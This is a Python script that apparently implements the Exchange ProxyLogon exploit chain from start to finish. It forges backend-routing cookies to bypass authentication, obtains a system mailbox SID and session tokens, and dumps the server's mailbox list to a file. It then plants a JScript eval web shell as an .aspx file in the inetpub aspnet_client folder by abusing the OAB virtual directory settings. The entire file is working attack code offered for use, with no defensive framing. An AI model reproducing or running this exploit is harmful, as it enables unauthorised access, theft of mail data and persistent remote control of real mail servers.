import urllib2
import httplib
import sys
import base64
import os
import ssl
import json

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

DEBUG = False
URL = "https://target.com/ecp/test.js"
HOSTNAMES = ["mail"]
HOSTNAME2 = "mail"
EMAIL = "SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}@target.com"
SSID = '-500'
SID = ""
DN = ""
SHELL = 'THISISFORTEST<script language="JScript" runat="server">function Page_Load(){var a=Request["REQ"];for(var i=0;i<400;i++){a=a.replace("|","");};eval(a);}</script>'

SHELL = SHELL.replace('"','\\"')
FILENAME = "TEST01.aspx"
FPATH = "C:\\\\inetpub\\\\wwwroot\\\\aspnet_client\\\\"


if(SID == ''):
    data = '''<?xml version="1.0" encoding="utf-8"?>
    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
    <soap:Header>
      <t:RequestServerVersion Version="Exchange2013" />
    </soap:Header>
      <soap:Body>
        <m:FindItem Traversal='Shallow'>
          <m:ItemShape>
            <t:BaseShape>IdOnly</t:BaseShape>
          </m:ItemShape>
          <m:ParentFolderIds>
            <t:DistinguishedFolderId Id='inbox'>
              <t:Mailbox>
                <t:EmailAddress>{EMAIL}</t:EmailAddress>
              </t:Mailbox>
            </t:DistinguishedFolderId>
          </m:ParentFolderIds>
        </m:FindItem>
      </soap:Body>
    </soap:Envelope>'''.replace('{EMAIL}',EMAIL)

    SID_OK = ''
    for HOSTNAME in HOSTNAMES:
        r = urllib2.Request(URL,data=data,headers={      'Content-Type': 'text/xml',
                                                         'User-Agent': 'ExchangeServicesClient/1.0.0.0',
                                                         'Cookie':'X-BEResource='+HOSTNAME+'/ews/Exchange.asmx?#~1942062534;',
                                                          'msExchLogonMailbox': 'S-1-5-20',
               
                                                         })

        try:
            r = urllib2.urlopen(r,context=ctx)
        except Exception as e:
            print e    
            r = e
        print r.info()
        DDATA = r.read()
        if(DEBUG):
            print DDATA
            
        try:
            print r.code
            SID = r.info()['Set-Cookie'].split('X-BackEndCookie=')[1].split('=')[0]
            print 'SID:',SID
            if(len(SID) > 20):
                SID_OK = SID
                break
        except Exception as e:
            print e

    if(True):
        if(len(DN) == 0):
            autoDiscoverBody = """<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
            <Request>
              <EMailAddress>{EMAIL}</EMailAddress> <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
            </Request>
        </Autodiscover>
        """.replace('{EMAIL}',EMAIL)
            r = urllib2.Request(URL,data=autoDiscoverBody,headers={      'Content-Type': 'text/xml',
                                                             'User-Agent': 'ExchangeServicesClient/0.0.0.0',
                                                             'Cookie':'X-BEResource='+HOSTNAME+'/autodiscover/autodiscover.xml?#~1942062534;',
                                                             'msExchLogonMailbox': 'S-1-5-20',
                   
                                                             })
            
            try:
                r = urllib2.urlopen(r,context=ctx)
            except Exception as e:
                print e    
                r = e
            datadn = r.read()
            print datadn
            legacyDn = str(datadn).split("<LegacyDN>")[1]
            
            legacyDn = legacyDn.split("</LegacyDN>")[0]
        else:
            legacyDn = DN
        print legacyDn
        mapi_body = legacyDn + "\x00\x00\x00\x00\x00\xe4\x04\x00\x00\x09\x04\x00\x00\x09\x04\x00\x00\x00\x00\x00\x00"
        r = urllib2.Request(URL,data=mapi_body,headers={
                                                         'User-Agent': 'ExchangeServicesClient/0.0.0.0',
                                                         'Cookie':'X-BEResource=@'+HOSTNAME2+':444/mapi/emsmdb?MailboxId=6583fe51-aaaa-aaaa-aaaa-5afb512c2c2a@test.com&a=#~1942062534;',
                                                         
                                                        "Content-Type": "application/mapi-http",
                                                        "X-RequestId": "5b8cd8f9-9a64-490d-8f0a-713c6cf078c9:1",
                                                        "X-RequestType": "Connect",
                                                        "X-ClientApplication": "MapiHttpClient/15.1.225.37",
                                                         'msExchLogonMailbox': 'S-1-5-20',
                                                         })
        
        
        try:
            r = urllib2.urlopen(r,context=ctx)

            DDATA = r.read()
            if(DEBUG):
                print DDATA
            SID_OK = str(DDATA).split("with SID ")[1].split(" and MasterAccountSid")[0]
            print r.code
            print SID_OK
        except Exception as e:
            print e
else:
    SID_OK = SID + SSID
NET_SessionId = ''
msExchEcpCanary = ''

if(len(SID_OK) < 20):
    print "[-] Faild SID"
    exit()

if(len(SID_OK) > 20):
    print '='*40

    SID_OK = '-'.join(SID_OK.split('-')[:-1]) + SSID
    print 'USE SID: ', SID_OK
    for HOSTNAME in HOSTNAMES:
        SID = '<r at="NTLM" ln="'+SID_OK+'"><s>'+SID_OK+'</s><s a="7" t="1">S-1-1-0</s><s a="7" t="1">S-1-5-2</s></r>'

        r = urllib2.Request(URL,data=SID,headers={      'Content-Type': 'text/xml',
                                                         'User-Agent': 'ExchangeServicesClient/0.0.0.0',
                                                         'Cookie':'X-BEResource=@'+HOSTNAME2+':444/ecp/proxylogon.ecp?#~1941962753;',
                                                        'msExchLogonMailbox': 'S-1-5-20',
                                                         })


        try:
            r = urllib2.urlopen(r,context=ctx)
        except Exception as e:
            print e    
            r = e

        print r.code
        
        cookie = r.info()['Set-Cookie'].split(' ')
        for c in cookie:
            if c.find('NET_SessionId') != -1:
                NET_SessionId = c.split('=')[1].replace(';','')
            elif c.find('msExchEcpCanary') != -1:
                msExchEcpCanary = c.split('=')[1].replace(';','')
        if(len(NET_SessionId) > 2 and len(msExchEcpCanary) > 2):
            print 'NET_SessionId:',NET_SessionId
            print 'msExchEcpCanary:',msExchEcpCanary
            break



print '='*40
print 'GET Mail Lists....'
data = '{"filter":{"Parameters":{"__type":"JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel"}},"sort":{}}'
r = urllib2.Request(URL,data=data,headers={      'Content-Type': 'application/json',
                                                 'User-Agent': 'ExchangeServicesClient/0.0.0.0',
                                                 'Cookie':'X-BEResource=@'+HOSTNAME2+':444/ecp/DDI/DDIService.svc/GetList?schema=MailboxService&msExchEcpCanary='+msExchEcpCanary+'&a=#~1942062564; msExchEcpCanary='+msExchEcpCanary+'; ASP.NET_SessionId='+NET_SessionId+';',
                                                 'msExchLogonMailbox': 'S-1-5-20',
                                                 })
try:
    r = urllib2.urlopen(r,context=ctx)
except Exception as e:
    print e    
    r = e
fp = open('MAIL.txt','w')
fp.write(r.read())
fp.close()
    



print '='*40
print 'GET VirtualDirectory'
data = '{"filter":{"Parameters":{"__type":"JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel","SelectedView":"","SelectedVDirType":"All"}},"sort":{}}'
r = urllib2.Request(URL,data=data,headers={      'Content-Type': 'application/json',
                                                 'User-Agent': 'ExchangeServicesClient/0.0.0.0',
                                                 'Cookie':'X-BEResource=@'+HOSTNAME2+':444/ecp/DDI/DDIService.svc/GetList?schema=VirtualDirectory&msExchEcpCanary='+msExchEcpCanary+'&a=#~1942062564; msExchEcpCanary='+msExchEcpCanary+'; ASP.NET_SessionId='+NET_SessionId+';',
                                                 'msExchLogonMailbox': 'S-1-5-20',
                                                 })
try:
    r = urllib2.urlopen(r,context=ctx)
except Exception as e:
    print e    
    r = e
DDATA = r.read()
if(DEBUG):
    print DDATA
html_json = str(DDATA)
html_json = json.loads(html_json)

for i in html_json['d']['Output']:
    if(i["Name"] == 'OAB (Default Web Site)'):
        RawIdentity = i["Identity"]["RawIdentity"]
        ServerS = i["Server"]
        print ServerS,"\t\t", RawIdentity
print "="*40       
for i in html_json['d']['Output']:
    if(i["Name"] == 'OAB (Default Web Site)'):
        if i["Server"] != HOSTNAME:
            continue
        RawIdentity = i["Identity"]["RawIdentity"]
        ServerS = i["Server"]
        print ServerS,"\t\t", RawIdentity



        data = '{"identity":{"__type":"Identity:ECP","DisplayName":"OAB (Default Web Site)","RawIdentity":"{RawIdentity}"},"properties":{"Parameters":{"__type":"JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel","InternalUrl":"http://o/#'+SHELL+'"}}}'
        r = urllib2.Request(URL,data=data.replace('{RawIdentity}',RawIdentity),headers={      'Content-Type': 'application/json',
                                                         'User-Agent': 'ExchangeServicesClient/0.0.0.0',
                                                         'Cookie':'X-BEResource=@'+HOSTNAME2+':444/ecp/DDI/DDIService.svc/SetObject?schema=OABVirtualDirectory&msExchEcpCanary='+msExchEcpCanary+'&a=#~1942062564; msExchEcpCanary='+msExchEcpCanary+'; ASP.NET_SessionId='+NET_SessionId+';',
                                                         'msExchLogonMailbox': 'S-1-5-20',
                                                         })
        try:
            r = urllib2.urlopen(r,context=ctx,timeout=10)
        except Exception as e:
            print e    
            r = e
        print '\t\tOABVirtualDirectory',r.code
        data = '{"identity": {"__type": "Identity:ECP","DisplayName": "OAB (Default Web Site)","RawIdentity": "{RawIdentity}"},"properties": {"Parameters": {"__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel","FilePathName": "'+FPATH+FILENAME+'"}}}'
        r = urllib2.Request(URL,data=data.replace('{RawIdentity}',RawIdentity),headers={      'Content-Type': 'application/json',
                                                         'User-Agent': 'ExchangeServicesClient/0.0.0.0',
                                                         'Cookie':'X-BEResource=@'+HOSTNAME2+':444/ecp/DDI/DDIService.svc/SetObject?schema=ResetOABVirtualDirectory&msExchEcpCanary='+msExchEcpCanary+'&a=#~1942062564; msExchEcpCanary='+msExchEcpCanary+'; ASP.NET_SessionId='+NET_SessionId+';',
                                                         'msExchLogonMailbox':'S-1-5-20',
                                                         })
        try:
            r = urllib2.urlopen(r,context=ctx,timeout=10)
        except Exception as e:
            print e    
            r = e
        print '\t\tResetOABVirtualDirectory',r.code
        print ''

